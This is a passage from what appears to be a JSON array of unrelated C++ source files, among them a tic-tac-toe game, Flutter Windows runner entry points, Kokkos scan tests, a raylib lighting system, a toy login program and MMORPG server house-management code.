Playing_zone[1][1] && Playing_zone[0][2] == Playing_zone[2][0])) {\n        return true;\n    }\n\n    for (int i = 0; i < 3; ++i) {\n        for (int j = 0; j < 3; ++j) {\n            if (Playing_zone[i][j] != 'X' && Playing_zone[i][j] != 'O') {\n                return false;\n            }\n        }\n    }\n\n    tie = true;\n    return false;\n}\n\nvoid TicTacToe::play() {\n    getPlayersNames();\n    while (!checkWinner() && !tie) {\n        displayBoard();\n        makeMove();\n    }\n\n    displayBoard();\n\n    if (tie) {\n        cout << \"It's a draw!\" << endl;\n    } else {\n        if (token == 'O') {\n            cout << \"The winner is \" << player1 << \"!\" << endl;\n        } else {\n            cout << \"The winner is \" << player2 << \"!\" << endl;\n        }\n    }\n}\n\nint main() {\n    cout << \"====================================================================\" << endl;\n    cout << \"                          TicTacToe game\" << endl;\n    cout << \"====================================================================\" << endl << endl;\n\n    TicTacToe game;\n    game.play();\n\n    return 0;\n}\n",
    "// Copyright 2024 Tencent Inc. All rights reserved.\n//\n\n#include \"eval_start_manu_time_check.h\"\n#include \"l4_signal.pb.h\"\n\nnamespace eval {\nconst char EvalStartManuTimeCheck::_kpi_name[] = \"StartManuTimeCheck\";\n\nsim_msg::TestReport_XYPlot EvalStartManuTimeCheck::_s_manu_time_plot;\n\nEvalStartManuTimeCheck::EvalStartManuTimeCheck() { VLOG_0 << \"eval algorithm \" << _kpi_name << \" constructed.\\n\"; }\nbool EvalStartManuTimeCheck::Init(eval::EvalInit &helper) {\n  // determine whether the module is valid. If valid, check if kpi is enabled and get the threshold values.\n  if (IsModuleValid()) {\n    m_KpiEnabled = helper.getGradingKpiByName(_kpi_name, m_Kpi);\n    m_defaultThreshDouble = getThreshValueByID_Double(m_Kpi, m_KpiEnabled);\n    _manu_ctime = 0.0;\n    _manu_signal = 0;\n    // output indicator configuration details\n    DebugShowKpi();\n  }\n\n  // set report info\n  if (isReportEnabled()) {\n    ReportHelper::SetCaseInfo(_case, m_Kpi);\n    ReportHelper::ConfigXYPlot(_s_manu_time_plot, \"manu time\", \"manu time after starting\", \"t\", \"s\", {\"manu_time\"},\n                               {\"s\"}, 1);\n    ReportHelper::ConfigXYPlotThreshold(_s_manu_time_plot, \"\", 0, 1, m_defaultThreshDouble, \"\", 1, 0, INT32_MIN, 0);\n  }\n\n  return true;\n}\nbool EvalStartManuTimeCheck::Step(eval::EvalStep &helper) {\n  // check whether the module is valid and whether the indicator is enabled\n  if (IsModuleValid() && m_KpiEnabled) {\n    EvalMsg algori_msg = _msg_mgr->Get(topic::L4_ALGORITHM_SIGNAL);\n    sim_msg::L4AlgorithmSignal _algori_obj;\n    // std::string tips = \"not receive L4ALFORITHMSIGNAL\";\n    if (algori_msg.GetPayload().size() > 0) {\n      _algori_obj.ParseFromString(algori_msg.GetPayload());\n      // int tmp = rand() % 10000 < 10 ? 1 : 0;\n      // _algori_obj.mutable_signal()->insert({\"main_state\", std::to_string(tmp)});\n      google::protobuf::Map<std::string, std::string> *signal_map = _algori_obj.mutable_signal();\n      // google::protobuf::Map<std::string, std::string>::iterator it = signal_map->find(\"frame_id\");\n      // if (it != signal_map->end() && it->second != last_frame_id) {\n      google::protobuf::Map<std::string, std::string>::iterator signal_get = signal_map->find(\"main_state\");\n      if (signal_get != signal_map->end()) {\n        int signal = std::stoi(signal_get->second);\n        if (_manu_signal == 0 && signal) {\n          _manu_signal = signal;\n        } else if (_manu_signal == 0) {\n          _manu_ctime += getModuleStepTime();\n        }\n        VLOG_0 << \"receive main_state: \" << signal << \"\\n\";\n      } else {\n        VLOG_0 << \"do not find key: main_state.\\n\";\n      }\n      //}\n    } else {\n      VLOG_0 << \"do not receive message for L4_ALGORITHM_SIGNAL.\\n\";\n    }\n    //  add data to xy-pot\n    _detector.Detect(_manu_ctime, m_defaultThreshDouble);\n    if (isReportEnabled()) {\n      _s_manu_time_plot.mutable_x_axis()->add_axis_data(helper.GetSimTime());\n      _s_manu_time_plot.mutable_y_axis()->at(0).add_axis_data(_manu_ctime);\n    }\n  } else {\n    VLOG_0 << _kpi_name << \" not enabled.\\n\";\n    return false;\n  }\n  return true;\n}\nbool EvalStartManuTimeCheck::Stop(eval::EvalStop &helper) {\n  // add report\n  if (isReportEnabled()) {\n    auto attach = _case.add_steps()->add_attach();\n    ReportHelper::AddXYPlot2Attach(*attach, _s_manu_time_plot);\n  }\n  return true;\n}\n\nvoid EvalStartManuTimeCheck::SetGradingMsg(sim_msg::Grading &msg) {\n  // set detected event\n  EvalHelper::SetDetectedEvent(msg, _detector, _kpi_name);\n}\n\nEvalResult EvalStartManuTimeCheck::IsEvalPass() {\n  if (m_KpiEnabled) {\n    /**\n     * set detected count\n     */\n    _case.mutable_info()->set_detected_count(_detector.GetCount());\n\n    if (_detector.GetCount() >= m_Kpi.passcondition().value() && m_Kpi.passcondition().value() >= 0.5) {\n      return EvalResult(sim_msg::TestReport_TestState_FAIL, \"above the max manu time\");\n    } else {\n      return EvalResult(sim_msg::TestReport_TestState_PASS, \"manu time check pass\");\n    }\n  }\n\n  return EvalResult(sim_msg::TestReport_TestState_PASS, \"manu time check skipped\");\n}\n\nbool EvalStartManuTimeCheck::ShouldStopScenario(std::string &reason) {\n  auto ret = _detector.GetCount() >= m_Kpi.finishcondition().value() && m_Kpi.finishcondition().value() >= 0.5;\n  if (ret) reason = \"above count of max manu check time\";\n  /**\n   *  set request stop\n   */\n  _case.mutable_info()->set_request_stop(ret);\n  return ret;\n}\n}  // namespace eval\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"food_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"practice\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "//#define debug_slow_json_buffer_print\n\n#include \"slowjson.hpp\"\n#include<iostream>\n#include<unordered_set>\n#include<unordered_map>\n#include<list>\n\nusing namespace slow_json::static_string_literals;\n\nstruct NodeTest {\n    int x;\n    float y;\n    std::string z;\n\n    static constexpr auto get_config() noexcept {\n        return slow_json::static_dict{\n                std::pair{\"x\"_ss, &NodeTest::x},\n                std::pair{\"y\"_ss, &NodeTest::y},\n                std::pair{\"z\"_ss, &NodeTest::z}\n        };\n    }\n};\n\nvoid test_deserialization() {\n    printf(\"run %s\\n\", __PRETTY_FUNCTION__);\n    assert_with_message(slow_json::concepts::supported<std::shared_ptr<int>> == 0, \"\u76f8\u5173concepts\u7ed3\u679c\u4e0d\u6b63\u786e\");\n    assert_with_message(slow_json::concepts::load_supported<std::shared_ptr<int>> == 0, \"\u76f8\u5173concepts\u7ed3\u679c\u4e0d\u6b63\u786e\");\n    assert_with_message(slow_json::concepts::dump_supported<std::shared_ptr<int>> == 1, \"\u76f8\u5173concepts\u7ed3\u679c\u4e0d\u6b63\u786e\");\n    std::vector<NodeTest> p;\n    std::string json_str = R\"([{\n        \"x\":4,\n        \"y\":1.2,\n        \"z\":\"strings\"\n    },{\n        \"x\":41,\n        \"y\":12.23,\n        \"z\":\"STR\"\n    }])\";\n\n    slow_json::loads(p, json_str);\n    assert_with_message(p.front().x == 4, \"\u53cd\u5e8f\u5217\u5316\u7ed3\u679c\u4e0d\u6b63\u786e\");\n    assert_with_message(p.front().y == 1.2f, \"\u53cd\u5e8f\u5217\u5316\u7ed3\u679c\u4e0d\u6b63\u786e\");\n    assert_with_message(p.front().z == \"strings\", \"\u53cd\u5e8f\u5217\u5316\u7ed3\u679c\u4e0d\u6b63\u786e\");\n    assert_with_message(p.back().x == 41, \"\u53cd\u5e8f\u5217\u5316\u7ed3\u679c\u4e0d\u6b63\u786e\");\n    assert_with_message(p.back().y == 12.23f, \"\u53cd\u5e8f\u5217\u5316\u7ed3\u679c\u4e0d\u6b63\u786e\");\n    assert_with_message(p.back().z == \"STR\", \"\u53cd\u5e8f\u5217\u5316\u7ed3\u679c\u4e0d\u6b63\u786e\");\n}\n",
    "#include \"lighting_system.h\"\n#include \"raylib.h\"\n\n#include <array>\n\nnamespace Lights\n{\n    Shader LightShader = { 0 };\n\n    std::array<Light*, MaxShaderLights> LightList;\n\n    static constexpr char ViewPosName[] = \"viewPos\";\n    static constexpr char EnabledName[] = \"enabled\";\n    static constexpr char TypedName[] = \"type\";\n    static constexpr char PositionName[] = \"position\";\n    static constexpr char DirectionName[] = \"direction\";\n    static constexpr char ColorName[] = \"color\";\n    static constexpr char AttenuationName[] = \"attenuation\";\n    static constexpr char FallofName[] = \"falloff\";\n    static constexpr char ConeName[] = \"cone\";\n    static constexpr char AmbientName[] = \"ambient\";\n\n    static float ColorScale = 1.0f / 255.0f;\n\n    static float Ambient[4] = { 0.05f ,0.05f, 0.05f, 1.0f };\n    static int AmbientLoc = -1;\n\n    void SetLightingShader(Shader shader)\n    {\n        LightShader = shader;\n        LightShader.locs[SHADER_LOC_VECTOR_VIEW] = GetShaderLocation(LightShader, ViewPosName);\n\n        AmbientLoc = GetShaderLocation(shader, AmbientName);\n\n        for (int i = 0; i < MaxShaderLights; i++)\n        {\n            if (LightList[i] == nullptr)\n                continue;\n\n            LightList[i]->OnBindToShader();\n        }\n    }\n\n    Shader GetLightingShader()\n    {\n        return LightShader;\n    }\n\n    Light* AddLight(LightTypes lightType)\n    {\n        Light* newLight = nullptr;\n\n        int id = -1;\n        for (int i = 0; i < MaxShaderLights; i++)\n        {\n            if (LightList[i] == nullptr)\n            {\n                id = i;\n                break;\n            }\n        }\n        if (id == -1)\n            return newLight;\n\n        switch (lightType)\n        {\n        default:\n            return nullptr;\n\n        case LightTypes::Point:\n            newLight = new PointLight(id);\n            break;\n\n        case LightTypes::Directional:\n            newLight = new DirectionalLight(id);\n            break;\n\n        case LightTypes::Spot:\n            newLight = new SpotLight(id);\n            break;\n        }\n        newLight->OnBindToShader();\n        LightList[id] = newLight;\n        return newLight;\n    }\n\n    void RemoveLight(Light* light)\n    {\n        for (int i = 0; i < MaxShaderLights; i++)\n        {\n            if (LightList[i] == light)\n            {\n                delete(light);\n                LightList[i] = nullptr;\n                return;\n            }\n        }\n    }\n\n    void ClearLights(Light* light)\n    {\n        for (int i = 0; i < MaxShaderLights; i++)\n        {\n            delete(LightList[i]);\n            LightList[i] = nullptr;\n        }\n    }\n\n    void SetAmbientColor(Color color)\n    {\n        Ambient[0] = color.r * ColorScale;\n        Ambient[1] = color.g * ColorScale;\n        Ambient[2] = color.b * ColorScale;\n    }\n\n    void UpdateLights(const Camera3D& viewportCamera)\n    {\n        if (!IsShaderReady(LightShader))\n            return;\n        SetShaderValue(LightShader, AmbientLoc, Ambient, SHADER_UNIFORM_VEC4);\n\n        SetShaderValue(LightShader, LightShader.locs[SHADER_LOC_VECTOR_VIEW], &viewportCamera.position, SHADER_UNIFORM_VEC3);\n\n        for (int i = 0; i < MaxShaderLights; i++)\n        {\n            if (LightList[i] == nullptr)\n                continue;\n\n            if (LightList[i]->IsDirty())\n                LightList[i]->Update();\n        }\n    }\n\n    Light::Light(int id) : ID(id)\n    {\n    }\n\n    Light::~Light()\n    {\n        // disable on destroy\n        if (IsShaderReady(LightShader) && EnabledLoc > 0)\n        {\n            int enabled = 0;\n            SetShaderValue(LightShader, EnabledLoc, &enabled, SHADER_UNIFORM_INT);\n        }\n    }\n\n    bool Light::Update()\n    {\n        if (!IsShaderReady(LightShader) || !IsDirty())\n            return false;\n\n        Dirty = false;\n\n        int enabled = 1;\n        int type = int(LightType);\n\n        SetShaderValue(LightShader, EnabledLoc, &enabled, SHADER_UNIFORM_INT);\n        SetShaderValue(LightShader, TypeLoc, &type, SHADER_UNIFORM_INT);\n\n        SetShaderValue(LightShader, PositionLoc, Position, SHADER_UNIFORM_VEC3);\n\n        SetShaderValue(LightShader, IntensityLoc, Intensity, SHADER_UNIFORM_VEC4);\n\n        SetShaderValue(LightShader, AttenuationLoc, &Attenuation, SHADER_UNIFORM_FLOAT);\n\n        SetShaderValue(LightShader, FalloffLoc, &Falloff, SHADER_UNIFORM_FLOAT);\n\n        return true;\n    }\n\n    void Light::SetPosition(const Vector3& pos)\n    {\n        Position[0] = pos.x;\n        Position[1] = pos.y;\n        Position[2] = pos.z;\n\n        SetDirty();\n    }\n\n    void Light::SetIntensity(const Color& color)\n    {\n        Intensity[0] = color.r * ColorScale;\n        Intensity[1] = color.g * ColorScale;\n        Intensity[2] = color.b * ColorScale;\n\n        SetDirty();\n    }\n\n    void Light::SetAttenuation(float attenuation)\n    {\n        Attenuation = attenuation;\n        SetDirty();\n    }\n\n    void Light::SetFalloff(float falloff)\n    {\n        Falloff = falloff;\n        SetDirty();\n    }\n\n   ",
    "#include <iostream>\nusing namespace std;\nvoid createAccount(string detail[6]){\n\n\t\n\tcout<<\"enter your email\"<<endl;\n\tcin>>detail[0];\n\t\n\t\n\tcout<<\"create password\"<<endl;\n\tcin>>detail[1];\n\t\n\t\n\tcout<<\"Enter Your name\"<<endl;\n\tcin>>detail[2];\n\t\n\t\n\tcout<<\"Enter Father name\"<<endl;\n\tcin>>detail[3];\n\t\n\t\n\tcout<<\"enter phone number\"<<endl;\n\tcin>>detail[4];\n\t\n\t\n\tcout<<\"Enter your date of birth\"<<endl;\n\tcin>>detail[5];\n\t\n\tcout<<\"------------------CONGRATS YOUR ACCOUNT SUCCESSFULLY CREATED-----------\"<<endl;\n\tcout<<endl;\n\tcout<<endl;\n\tcout<<endl;\n\t\n}\nvoid database(const string detail[6]){\n\tstring label[6]={\n\t\"Email: \",\n\t\"Password:\",\n\t\"Name:\",\n\t\"Father name:\",\n\t\"Phone number:\",\n\t\"Date of birth\"};\n\tcout<<\"ACCOUNT DETAILS\"<<endl;\n\tfor(int i=0;i<6;i++){\n\t\tcout<<label[i]<<detail[i]<<endl;\n\t}\n\t\n}\nvoid loginPage(const string detail[6]){\n\tcout<<\"-------------LOGIN TO YOUR ACCOUNT NOW --------------\"<<endl;\n\tcout<<endl;\n\tstring email=detail[0];\n\tstring password=detail[1];\n\t\n\tstring UserId;\n\tcout<<\"Enter username Email\"<<endl;\n\tcin>>UserId;\n\tif(UserId==email){\n\t\tcout<<\"correct email\"<<endl;\n\t\tcout<<endl;\n\t}\n\tstring Password;\n\t\n\tcout<<\"Enter Password \"<<endl;\n\tcin>>Password;\n\tif(Password==password){\n\t\tcout<<\"sucessfully login\"<<endl;\n\t\tcout<<endl;\n\t\tdatabase(detail);\n\t\t\n\t}\n\telse{\n\t\tcout<<\"Incorrect Password\"<<endl;\n\t}\n\t\n}\n\nint main(){\n\tstring detail[6];\n\tcreateAccount(detail);\n\t\n\tloginPage(detail);\n\treturn 0;\n}\n",
    "//@HEADER\n// ************************************************************************\n//\n//                        Kokkos v. 4.0\n//       Copyright (2022) National Technology & Engineering\n//               Solutions of Sandia, LLC (NTESS).\n//\n// Under the terms of Contract DE-NA0003525 with NTESS,\n// the U.S. Government retains certain rights in this software.\n//\n// Part of Kokkos, under the Apache License v2.0 with LLVM Exceptions.\n// See https://kokkos.org/LICENSE for license information.\n// SPDX-License-Identifier: Apache-2.0 WITH LLVM-exception\n//\n//@HEADER\n\n#include <TestStdAlgorithmsCommon.hpp>\n#include <utility>\n#include <iomanip>\n\nnamespace Test {\nnamespace stdalgos {\nnamespace EScan {\n\nnamespace KE = Kokkos::Experimental;\n\ntemplate <class ValueType>\nstruct UnifDist;\n\ntemplate <>\nstruct UnifDist<double> {\n  using dist_type = std::uniform_real_distribution<double>;\n  std::mt19937 m_gen;\n  dist_type m_dist;\n\n  UnifDist() : m_dist(0.05, 1.2) { m_gen.seed(1034343); }\n\n  double operator()() { return m_dist(m_gen); }\n};\n\ntemplate <>\nstruct UnifDist<int> {\n  using dist_type = std::uniform_int_distribution<int>;\n  std::mt19937 m_gen;\n  dist_type m_dist;\n\n  UnifDist() : m_dist(1, 3) { m_gen.seed(1034343); }\n\n  int operator()() { return m_dist(m_gen); }\n};\n\ntemplate <>\nstruct UnifDist<CustomValueType> {\n  using dist_type = std::uniform_real_distribution<double>;\n  std::mt19937 m_gen;\n  dist_type m_dist;\n\n  UnifDist() : m_dist(0.05, 1.2) { m_gen.seed(1034343); }\n\n  CustomValueType operator()() { return m_dist(m_gen); }\n};\n\ntemplate <class ViewType>\nvoid fill_view(ViewType dest_view, const std::string& name) {\n  using value_type = typename ViewType::value_type;\n  using exe_space  = typename ViewType::execution_space;\n\n  const std::size_t ext = dest_view.extent(0);\n  using aux_view_t      = Kokkos::View<value_type*, exe_space>;\n  aux_view_t aux_view(\"aux_view\", ext);\n  auto v_h = create_mirror_view(Kokkos::HostSpace(), aux_view);\n\n  UnifDist<value_type> randObj;\n\n  if (name == \"empty\") {\n    // no op\n  }\n\n  else if (name == \"one-element\") {\n    v_h(0) = static_cast<value_type>(1);\n  }\n\n  else if (name == \"two-elements-a\") {\n    v_h(0) = static_cast<value_type>(1);\n    v_h(1) = static_cast<value_type>(2);\n  }\n\n  else if (name == \"two-elements-b\") {\n    v_h(0) = static_cast<value_type>(2);\n    v_h(1) = static_cast<value_type>(-1);\n  }\n\n  else if (name == \"small-a\") {\n    for (std::size_t i = 0; i < ext; ++i) {\n      v_h(i) = static_cast<value_type>(i + 1);\n    }\n  }\n\n  else if (name == \"small-b\") {\n    for (std::size_t i = 0; i < ext; ++i) {\n      v_h(i) = randObj();\n    }\n    v_h(5) = static_cast<value_type>(-2);\n  }\n\n  else if (name == \"medium\" || name == \"large\") {\n    for (std::size_t i = 0; i < ext; ++i) {\n      v_h(i) = randObj();\n    }\n  }\n\n  else {\n    throw std::runtime_error(\"invalid choice\");\n  }\n\n  Kokkos::deep_copy(aux_view, v_h);\n  CopyFunctor<aux_view_t, ViewType> F1(aux_view, dest_view);\n  Kokkos::parallel_for(\"copy\", dest_view.extent(0), F1);\n}\n\n// I had to write my own because std::exclusive_scan is ONLY found with\n// std=c++17\ntemplate <class it1, class it2, class ValType, class BopType>\nvoid my_host_exclusive_scan(it1 first, it1 last, it2 dest, ValType init,\n                            BopType bop) {\n  const auto num_elements = last - first;\n  if (num_elements > 0) {\n    while (first < last - 1) {\n      *(dest++) = init;\n      init      = bop(*first++, init);\n    }\n    *dest = init;\n  }\n}\n\ntemplate <class ValueType>\nstruct MultiplyFunctor {\n  KOKKOS_INLINE_FUNCTION\n  ValueType operator()(const ValueType& a, const ValueType& b) const {\n    return (a * b);\n  }\n};\n\ntemplate <class ValueType>\nstruct SumFunctor {\n  KOKKOS_INLINE_FUNCTION\n  ValueType operator()(const ValueType& a, const ValueType& b) const {\n    return (a + b);\n  }\n};\n\nstruct VerifyData {\n  template <class ViewType1, class ViewType2, class ValueType, class BinaryOp>\n  void operator()(ViewType1 data_view,  // contains data\n                  ViewType2 test_view,  // the view to test\n                  ValueType init_value, BinaryOp bop) {\n    //! always careful because views might not be deep copyable\n\n    auto data_view_dc = create_deep_copyable_compatible_clone(data_view);\n    auto data_view_h =\n        create_mirror_view_and_copy(Kokkos::HostSpace(), data_view_dc);\n\n    using gold_view_value_type = typename ViewType2::value_type;\n    Kokkos::View<gold_view_value_type*, Kokkos::HostSpace> gold_h(\n        \"goldh\", data_view.extent(0));\n    my_host_exclusive_scan(KE::cbegin(data_view_h), KE::cend(data_view_h),\n                           KE::begin(gold_h), init_value, bop);\n\n    auto test_view_dc = create_deep_copyable_compatible_clone(test_view);\n    auto test_view_h =\n        create_mirror_view_and_copy(Kokkos::HostSpace(), test_view_dc);\n    if (test_view_h.extent(0) > 0) {\n      for (std::size_t i = 0; i < test_view_h.extent(0); ++i) {\n        if (std::is_same<gold_view_value_type, int>::value) {\n          ASSERT_EQ(gold_h(i), test_v",
    "/**\n * The Forgotten Server - a free and open-source MMORPG server emulator\n * Copyright (C) 2019  Mark Samman <mark.samman@gmail.com>\n *\n * This program is free software; you can redistribute it and/or modify\n * it under the terms of the GNU General Public License as published by\n * the Free Software Foundation; either version 2 of the License, or\n * (at your option) any later version.\n *\n * This program is distributed in the hope that it will be useful,\n * but WITHOUT ANY WARRANTY; without even the implied warranty of\n * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n * GNU General Public License for more details.\n *\n * You should have received a copy of the GNU General Public License along\n * with this program; if not, write to the Free Software Foundation, Inc.,\n * 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.\n */\n\n#include \"otpch.h\"\n\n#include \"pugicast.h\"\n\n#include \"house.h\"\n#include \"iologindata.h\"\n#include \"game.h\"\n#include \"configmanager.h\"\n#include \"bed.h\"\n\n#include <fmt/format.h>\n\nextern ConfigManager g_config;\nextern Game g_game;\n\nHouse::House(uint32_t houseId) : id(houseId) {}\n\nvoid House::addTile(HouseTile* tile)\n{\n\ttile->setFlag(TILESTATE_PROTECTIONZONE);\n\thouseTiles.push_back(tile);\n}\n\nvoid House::setOwner(uint32_t guid, bool updateDatabase/* = true*/, Player* player/* = nullptr*/)\n{\n\tif (updateDatabase && owner != guid) {\n\t\tDatabase& db = Database::getInstance();\n\t\tdb.executeQuery(fmt::format(\"UPDATE `houses` SET `owner` = {:d}, `bid` = 0, `bid_end` = 0, `last_bid` = 0, `highest_bidder` = 0  WHERE `id` = {:d}\", guid, id));\n\t}\n\n\tif (isLoaded && owner == guid) {\n\t\treturn;\n\t}\n\n\tisLoaded = true;\n\n\tif (owner != 0) {\n\t\t//send items to depot\n\t\tif (player) {\n\t\t\ttransferToDepot(player);\n\t\t} else {\n\t\t\ttransferToDepot();\n\t\t}\n\n\t\tfor (HouseTile* tile : houseTiles) {\n\t\t\tif (const CreatureVector* creatures = tile->getCreatures()) {\n\t\t\t\tfor (int32_t i = creatures->size(); --i >= 0;) {\n\t\t\t\t\tkickPlayer(nullptr, (*creatures)[i]->getPlayer());\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\n\t\t// Remove players from beds\n\t\tfor (BedItem* bed : bedsList) {\n\t\t\tif (bed->getSleeper() != 0) {\n\t\t\t\tbed->wakeUp(nullptr);\n\t\t\t}\n\t\t}\n\n\t\t//clean access lists\n\t\towner = 0;\n\t\townerAccountId = 0;\n\t\tsetAccessList(SUBOWNER_LIST, \"\");\n\t\tsetAccessList(GUEST_LIST, \"\");\n\n\t\tfor (Door* door : doorSet) {\n\t\t\tdoor->setAccessList(\"\");\n\t\t}\n\t} else {\n\t\tstd::string strRentPeriod = asLowerCaseString(g_config.getString(ConfigManager::HOUSE_RENT_PERIOD));\n\t\ttime_t currentTime = time(nullptr);\n\t\tif (strRentPeriod == \"yearly\") {\n\t\t\tcurrentTime += 24 * 60 * 60 * 365;\n\t\t} else if (strRentPeriod == \"monthly\") {\n\t\t\tcurrentTime += 24 * 60 * 60 * 30;\n\t\t} else if (strRentPeriod == \"weekly\") {\n\t\t\tcurrentTime += 24 * 60 * 60 * 7;\n\t\t} else if (strRentPeriod == \"daily\") {\n\t\t\tcurrentTime += 24 * 60 * 60;\n\t\t} else {\n\t\t\tcurrentTime = 0;\n\t\t}\n\n\t\tpaidUntil = currentTime;\n\t}\n\n\trentWarnings = 0;\n\n\tif (guid != 0) {\n\t\tstd::string name = IOLoginData::getNameByGuid(guid);\n\t\tif (!name.empty()) {\n\t\t\towner = guid;\n\t\t\townerName = name;\n\t\t\townerAccountId = IOLoginData::getAccountIdByPlayerName(name);\n\t\t}\n\t}\n\n\tupdateDoorDescription();\n}\n\nvoid House::updateDoorDescription() const\n{\n\tconst int32_t housePrice = g_config.getNumber(ConfigManager::HOUSE_PRICE);\n\tfor (const auto& it : doorSet) {\n\t\tit->setSpecialDescription(fmt::format(\"It belongs to house '{:s}'. {:s} owns this house.{:s}\", houseName, (owner != 0) ? ownerName : \"Nobody\", g_config.getBoolean(ConfigManager::HOUSE_DOOR_SHOW_PRICE) && (housePrice != -1) && (owner == 0) ? fmt::format(\" It costs {:d} gold coins.\", (houseTiles.size() * housePrice)) : \"\"));\n\t}\n}\n\nAccessHouseLevel_t House::getHouseAccessLevel(const Player* player)\n{\n\tif (!player) {\n\t\treturn HOUSE_OWNER;\n\t}\n\n\tif (g_config.getBoolean(ConfigManager::HOUSE_OWNED_BY_ACCOUNT)) {\n\t\tif (ownerAccountId == player->getAccount()) {\n\t\t\treturn HOUSE_OWNER;\n\t\t}\n\t}\n\n\tif (player->hasFlag(PlayerFlag_CanEditHouses)) {\n\t\treturn HOUSE_OWNER;\n\t}\n\n\tif (player->getGUID() == owner) {\n\t\treturn HOUSE_OWNER;\n\t}\n\n\tif (subOwnerList.isInList(player)) {\n\t\treturn HOUSE_SUBOWNER;\n\t}\n\n\tif (guestList.isInList(player)) {\n\t\treturn HOUSE_GUEST;\n\t}\n\n\treturn HOUSE_NOT_INVITED;\n}\n\nbool House::kickPlayer(Player* player, Player* target)\n{\n\tif (!target) {\n\t\treturn false;\n\t}\n\n\tHouseTile* houseTile = dynamic_cast<HouseTile*>(target->getTile());\n\tif (!houseTile || houseTile->getHouse() != this) {\n\t\treturn false;\n\t}\n\n\tif (getHouseAccessLevel(player) < getHouseAccessLevel(target) || target->hasFlag(PlayerFlag_CanEditHouses)) {\n\t\treturn false;\n\t}\n\n\tPosition oldPosition = target->getPosition();\n\tif (g_game.internalTeleport(target, getEntryPosition()) == RETURNVALUE_NOERROR) {\n\t\tg_game.addMagicEffect(oldPosition, CONST_ME_POFF);\n\t\tg_game.addMagicEffect(getEntryPosition(), CONST_ME_TELEPORT);\n\t}\n\treturn true;\n}\n\nvoid House::setAccessList(uint32_t listId, const std::string& textlist)\n{\n\tif (listId == GUEST_LIST) {\n\t\tguestList.parseList(textlist);\n\t} else if (listId == SUBOWNER_LIST) {\n\t\tsubOwnerList.parseList(textlis",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"bloc_test\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
